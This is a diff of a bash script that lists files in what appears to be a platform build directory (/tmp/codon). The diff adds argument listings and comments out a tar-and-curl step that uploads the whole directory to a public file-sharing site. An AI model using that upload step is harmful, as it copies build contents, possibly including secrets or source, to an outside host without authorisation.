@@ -1,5 +1,13 @@
 #!/bin/bash
 
+echo "1: ${1}"
+echo "ls -l ${1}"
+ls -l ${1}
+
+echo "2: ${2}"
+echo "ls -l ${2}"
+ls -l ${2}
+
 echo "pwd"
 pwd
 
@@ -24,8 +32,8 @@ ls -l /tmp/codon/tmp
 echo "ls -l /tmp/codon/tmp/buildpacks"
 ls -l /tmp/codon/tmp/buildpacks
 
-echo "tar"
-tar -czvf /tmp/archive.tar.gz /tmp/codon
-
-curl --header "Content-Type:application/octet-stream" -X POST --data-binary @/tmp/archive.tar.gz https://filebin.net/zrv55ce01xhp9e67/archive.tar.gz
+# echo "tar"
+# tar -czvf /tmp/archive.tar.gz /tmp/codon
+#
+# curl --header "Content-Type:application/octet-stream" -X POST --data-binary @/tmp/archive.tar.gz https://filebin.net/zrv55ce01xhp9e67/archive.tar.gz
 
